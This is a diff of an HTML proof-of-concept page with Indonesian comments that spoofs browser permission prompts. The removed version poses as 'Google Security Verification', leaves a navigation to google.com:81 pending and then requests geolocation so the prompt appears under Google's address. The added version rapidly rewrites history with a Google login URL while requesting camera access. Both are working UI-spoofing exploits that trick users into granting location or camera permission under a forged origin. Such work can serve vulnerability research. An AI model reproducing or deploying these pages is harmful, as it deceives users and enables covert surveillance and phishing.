@@ -3,26 +3,20 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Google Security Verification</title>
+<title>Camera Permission + History Desync</title>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
-  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
-  h2 { color: #4285f4; margin-bottom: 10px; }
-  p { color: #666; font-size: 14px; margin-bottom: 20px; }
-  button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
-  button:hover { background: #1557b0; }
-  #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; }
+  body { font-family: sans-serif; padding: 40px; text-align: center; }
+  .btn { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; }
+  #status { margin-top: 20px; font-family: monospace; color: #666; }
 </style>
 </head>
 <body>
 
-<div class="panel" id="main-card">
-  <h2>🔒 Google Security Verification</h2>
-  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diarahkan ke server aman Google dan diminta mengizinkan lokasi.</p>
-  <button id="startBtn">Verify Account & Allow Location</button>
-  <div id="status">[*] Ready...</div>
-</div>
+<h2>Camera Permission + History Desync</h2>
+<p>Klik tombol di bawah. Perhatikan address bar saat prompt kamera muncul.</p>
+
+<button id="startBtn" class="btn">Trigger Camera & Desync</button>
+<div id="status">[*] Ready...</div>
 
 <script>
 (function () {
@@ -30,69 +24,66 @@
 
   var btn = document.getElementById('startBtn');
   var statusEl = document.getElementById('status');
+  var counter = 0;
+  var isRunning = true;
 
   function log(msg) {
     statusEl.textContent = msg;
-    console.log("[Location Spoof] " + msg);
+    console.log("[Camera Desync] " + msg);
   }
 
   // ============================================
-  // 1. TRIGGER (KLIK)
+  // 1. HISTORY DESYNC LOOP
   // ============================================
-  btn.addEventListener('click', function() {
-    log("[*] Memulai location permission spoofing...");
+  function desyncHistory() {
+    if (!isRunning) return;
 
-    // ============================================
-    // 2. REDIRECT KE GOOGLE:81 (PENDING NAVIGATION)
-    // ============================================
-    // Port 81 biasanya tertutup, menciptakan delay (timeout).
-    try {
-      window.location.href = "https://www.google.com:81";
-    } catch (e) {
-      log("[-] Redirect error: " + e.message);
+    counter++;
+    
+    // Ganti URL secara berulang
+    history.replaceState(null, '', '?...............................https://accounts.google.com/login/device/verify');
+    
+    setTimeout(function() {
+      history.replaceState(null, '', '/');
+    }, 0);
+
+    if (counter % 1000 === 0) {
+      log('[*] Desync count: ' + counter);
     }
 
-    // ============================================
-    // 3. SELAMA DELAY, MINTA IZIN LOKASI
-    // ============================================
-    // Prompt lokasi muncul saat address bar menampilkan google.com:81.
+    requestAnimationFrame(desyncHistory);
+  }
+
+  // ============================================
+  // 2. CAMERA PERMISSION
+  // ============================================
+  function requestCamera() {
+    log("[*] Meminta Izin Kamera...");
+    
+    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+      .then(function(stream) {
+        log("[+] Kamera DIIZINKAN!");
+        stream.getTracks().forEach(function(t) { t.stop(); });
+      })
+      .catch(function(err) {
+        log("[-] Kamera ditolak: " + err.name);
+      });
+  }
+
+  // ============================================
+  // 3. TRIGGER
+  // ============================================
+  btn.addEventListener('click', function() {
+    // Mulai desync
+    requestAnimationFrame(desyncHistory);
+    
+    // Minta kamera setelah 500ms (saat desync berjalan)
+    setTimeout(requestCamera, 500);
+    
+    // Stop desync setelah 10 detik
     setTimeout(function() {
-      log("[*] Meminta Izin Lokasi (saat pending navigation)...");
-      
-      if (!navigator.geolocation) {
-        log("[-] Geolocation tidak didukung.");
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition(
-        function(position) {
-          log("[+] Lokasi DIIZINKAN!");
-          log("Lat: " + position.coords.latitude + ", Lon: " + position.coords.longitude);
-          
-          // Tampilkan pesan sukses
-          document.body.innerHTML = `
-            <div style="background:#fff;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.1);max-width:400px;width:100%;text-align:center;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;">
-              <h2 style="color:#34a853;">✅ Verifikasi Berhasil</h2>
-              <p style="color:#666;">Lokasi telah diizinkan. Anda akan diarahkan ke Google.</p>
-            </div>
-          `;
-          
-          // Redirect ke Google asli setelah 2 detik
-          setTimeout(function() {
-            window.location.replace('https://www.google.com');
-          }, 2000);
-        },
-        function(error) {
-          log("[-] Lokasi ditolak: " + error.message);
-          // Jika ditolak, tetap redirect ke Google
-          setTimeout(function() {
-            window.location.replace('https://www.google.com');
-          }, 1000);
-        },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-      );
-    }, 1000); // 1 detik setelah redirect (saat pending)
-
+      isRunning = false;
+    }, 10000);
   }, { once: true });
 
 })();
